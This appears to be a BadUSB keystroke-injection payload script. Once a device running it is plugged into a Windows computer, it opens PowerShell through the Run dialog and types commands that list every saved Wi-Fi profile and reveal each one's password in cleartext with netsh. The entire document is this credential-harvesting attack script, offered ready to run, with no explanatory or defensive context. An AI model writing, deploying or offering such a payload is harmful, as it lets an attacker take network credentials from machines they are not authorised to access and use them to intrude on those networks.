layout("us");
typingSpeed(0,0);

press("GUI r");
type("powershell");
press("ENTER");
delay(500);

type("$wifiProfiles = netsh wlan show profiles | Select-String \"All User Profile\"");
press("ENTER");
delay(500);

type("foreach ($profile in $wifiProfiles) {");
press("ENTER");
type("    $profileName = $profile -replace \"    All User Profile\\s*:\\s*\",\"\"");
press("ENTER");
type("    $wifiPassword = (netsh wlan show profile name=\"$profileName\" key=clear) | Select-String \"Key Content\"");
press("ENTER");
type("    $password = $wifiPassword -replace \".*Key Content\\s*:\\s*\",\"\"");
press("ENTER");
type("    Write-Output \"$profileName : $password\"");
press("ENTER");
type("}");
press("ENTER");
